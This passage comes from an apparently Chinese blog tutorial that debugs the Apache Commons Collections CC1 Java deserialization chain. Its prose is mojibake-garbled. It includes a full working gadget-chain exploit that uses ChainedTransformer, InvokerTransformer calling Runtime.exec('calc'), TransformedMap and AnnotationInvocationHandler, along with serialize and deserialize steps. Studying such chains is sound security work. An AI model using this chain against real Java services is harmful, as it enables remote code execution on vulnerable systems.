</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">reflect</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;value1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;value2&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">3</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;value3&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">4</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;value4&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">5</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;value5&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Integer</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">keySet</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;key: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;  value: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">key</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">entrySet</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ÊàêÂäüËøõÂÖ•Âæ™ÁéØÈÅçÂéÜ&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;key: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getKey</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;  value: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getValue</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàêÂäüËæìÂá∫</p>
<p><img src="/p/cc1/image-20240722160534907.png"
	width="338"
	height="467"
	srcset="/p/cc1/image-20240722160534907_hu17731732726328238509.png 480w, /p/cc1/image-20240722160534907_hu14615898695940670433.png 1024w"
	loading="lazy"
	
		alt="image-20240722160534907"
	
	
		class="gallery-image" 
		data-flex-grow="72"
		data-flex-basis="173px"
	
></p>
<p>‰ΩÜÊòØÂΩìÊàë‰ΩøÁî®Â¶Ç‰∏ã‰ª£Á†ÅÊµãËØïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">reflect</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Integer</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">keySet</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;key: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;  value: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">key</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">Integer</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">entry</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">map</span><span class="p">.</span><span class="na">entrySet</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;ÊàêÂäüËøõÂÖ•Âæ™ÁéØÈÅçÂéÜ&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;key: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getKey</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;  value: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getValue</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Âç¥‰ªÄ‰πàÈÉΩÊ≤°ÊúâÔºåËøô‰∏™ÁªìÊûúÈÇ£Â∞±Á°ÆÂÆûËØ¥Êòé‰∫Ü*Êàë‰ª¨ÈúÄË¶ÅÂêëMap‰∏≠ÈîÆÂÖ•Ëá≥Â∞ë‰∏ÄÂØπÈîÆÂÄºÂØπÊâçËÉΩÊàêÂäüËøõÂÖ•Âà∞Ëøô‰∏™forÂæ™ÁéØ„ÄÇ*ÂêéÁª≠Êúâ‰∏™ÈóÆÈ¢òÔºåÁõ¥Êé•ËÆ≤‰∫ÜÔºö</p>
<p><img src="/p/cc1/image-20240722161806463.png"
	width="650"
	height="82"
	srcset="/p/cc1/image-20240722161806463_hu18302454093083286655.png 480w, /p/cc1/image-20240722161806463_hu7420053946365932049.png 1024w"
	loading="lazy"
	
		alt="image-20240722161806463"
	
	
		class="gallery-image" 
		data-flex-grow="792"
		data-flex-basis="1902px"
	
></p>
<p>ËøôÈáåÁúãreadObject()Ê∫êÁ†ÅÔºåÂèØ‰ª•Áü•ÈÅìÈúÄË¶ÅÂ∞ÜËøô‰∏™ÂÄºËÆæÁΩÆ‰∏∫StringÈÇ£‰πàÊµãËØï‰ª£Á†ÅÂ∞±ÂèØ‰ª•ÊîπÊàêÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Runtime</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Retention</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Class</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">                                                             </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;ceshi&#34;</span><span class="p">,</span><span class="s">&#34;value1&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">chain</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor1</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Retention</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">map2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//Â∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ÂèçÂ∫èÂàóÂåñ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">unserialize</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w">  </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">unserialize</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;ser.ser&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">o</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÜçË∞ÉËØïÊàêÂäüËøõÂÖ•forÂæ™ÁéØÔºå‰ΩÜÊòØÂπ∂Ê≤°ÊúâÊàêÂäüÂºπÂá∫ËÆ°ÁÆóÊú∫ÔºåÈÇ£‰πàÁªßÁª≠ÊâìÊñ≠ÁÇπÔºåÂ¶Ç‰∏ãÊâìÊñ≠ÁÇπÊó∂‰ºöÁõ¥Êé•ÈÄÄÂá∫</p>
<p><img src="/p/cc1/image-20240722162106738.png"
	width="749"
	height="73"
	srcset="/p/cc1/image-20240722162106738_hu13690766191035211726.png 480w, /p/cc1/image-20240722162106738_hu8488415182653778124.png 1024w"
	loading="lazy"
	
		alt="image-20240722162106738"
	
	
		class="gallery-image" 
		data-flex-grow="1026"
		data-flex-basis="2462px"
	
></p>
<p>ËØ¥ÊòéÂπ∂Ê≤°ÊúâËøõÂÖ•Ëøô‰∏™ifÊù°‰ª∂ÔºåÈÇ£‰πàÁé∞Âú®ÈáçÁÇπÂÖ≥Ê≥®memberTypeÁöÑËµãÂÄºËØ≠Âè•Ôºö</p>
<p><img src="/p/cc1/image-20240722162221416.png"
	width="713"
	height="153"
	srcset="/p/cc1/image-20240722162221416_hu899189085486053304.png 480w, /p/cc1/image-20240722162221416_hu12674869813299877200.png 1024w"
	loading="lazy"
	
		alt="image-20240722162221416"
	
	
		class="gallery-image" 
		data-flex-grow="466"
		data-flex-basis="1118px"
	
></p>
<p>ÂÜçÂú®ifËØ≠Âè•Êâì‰∏Ä‰∏™Êñ≠ÁÇπÔºåÊ≠§Êó∂ÂÄºÁöÑÊÉÖÂÜµ‰∏∫Ôºö</p>
<p><img src="/p/cc1/image-20240722162417339.png"
	width="591"
	height="223"
	srcset="/p/cc1/image-20240722162417339_hu2862525158202971449.png 480w, /p/cc1/image-20240722162417339_hu13984790990053326827.png 1024w"
	loading="lazy"
	
		alt="image-20240722162417339"
	
	
		class="gallery-image" 
		data-flex-grow="265"
		data-flex-basis="636px"
	
></p>
<p>ÈÇ£‰πàÁé∞Âú®Áúã‰∏Ä‰∏ãËøô‰∏™Ë∞ÉÁî®ÁöÑgetÊñπÊ≥ïÔºåÂâçÈù¢Â∑≤ÁªèËØ¥Ëøá‰∫ÜmemberTypes‰∏∫HashMapÁ±ªÂÆû‰æãÔºåÈÇ£Áé∞Âú®Â∞±ÁúãHashMapÁ±ªÁöÑgetÊñπÊ≥ïÔºåÊ∫êÁ†ÅÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">V</span><span class="w"> </span><span class="nf">get</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Node</span><span class="o">&lt;</span><span class="n">K</span><span class="p">,</span><span class="n">V</span><span class="o">&gt;</span><span class="w"> </span><span class="n">e</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getNode</span><span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">key</span><span class="p">),</span><span class="w"> </span><span class="n">key</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">value</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÈÇ£Áé∞Âú®ÂÜçÂ¶Ç‰∏ãÊâìÊñ≠ÁÇπÔºö</p>
<p><img src="/p/cc1/image-20240722162852352.png"
	width="761"
	height="66"
	srcset="/p/cc1/image-20240722162852352_hu8400245750590523326.png 480w, /p/cc1/image-20240722162852352_hu1996567701053990746.png 1024w"
	loading="lazy"
	
		alt="image-20240722162852352"
	
	
		class="gallery-image" 
		data-flex-grow="1153"
		data-flex-basis="2767px"
	
></p>
